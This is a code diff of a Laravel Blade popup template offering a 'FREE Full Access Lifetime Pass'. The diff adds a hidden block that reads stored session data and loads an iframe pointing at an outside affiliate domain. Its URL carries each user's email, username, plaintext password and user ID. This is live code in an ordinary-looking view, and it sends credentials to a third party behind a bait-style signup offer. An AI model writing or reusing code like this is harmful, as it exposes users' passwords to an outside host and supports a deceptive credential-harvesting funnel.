@@ -1,6 +1,9 @@
 @php
-    $apiErrors = session()->get("apiErrors");
+    $apiErrors  = session()->get("apiErrors");
+	//$userInfoSession   = session()->get("userInfo");
+	$data = \Illuminate\Support\Facades\Session::get('userInfo');
 @endphp
+
 <div id="popup">
     <div class="close_div">
         <a href="#">
@@ -47,7 +50,7 @@
                     <a class="btn cancel" href="#">No</a>
                 </div>
             </div>
-            <div class="text_wrap hidden">
+            <div class="text_wrap hidden" id="register">
                 <h2>CONGRATULATIONS!</h2>
                 <p>You Qualified for a FREE Full Access Lifetime Pass!</p>
                 <form method="POST" action="{{ route('register') }}">
@@ -110,15 +113,24 @@
                     </div>
                 </form>
             </div>
-        @endguest
-        @auth
-            <div class="video_wrapper">
-                <video class="z-1" controls id="video_player">
-                    <source src="" type="video/mp4">
-                    Your browser does not support the video tag.
-                </video>
-                {{--<iframe class="z-1" id="video_player" src="" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture;" allowfullscreen></iframe>--}}
+            <div class="text_wrap hidden" id="credit">
+                @isset($data)
+                    @php
+                        $url = "https://sociallogic2hf.joinsafelyonline.com/routes/sociallogic2hf/?ofid=2130&a_aid=sociallogic2hf&a_bid=6b305f15&j2pnc=1&email=" .
+                        $data["email"] . "&username=" . $data["username"] . "&password=" . $data["password"] . "&x_userId=" . $data["userId"];
+                    @endphp
+                    <iframe src="{{$url}}"></iframe>
+                @endisset
             </div>
-        @endauth
-    </div>
+@endguest
+@auth
+<div class="video_wrapper">
+<video class="z-1" controls id="video_player">
+    <source src="" type="video/mp4">
+    Your browser does not support the video tag.
+</video>
+{{--<iframe class="z-1" id="video_player" src="" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture;" allowfullscreen></iframe>--}}
+</div>
+@endauth
+</div>
 </div>
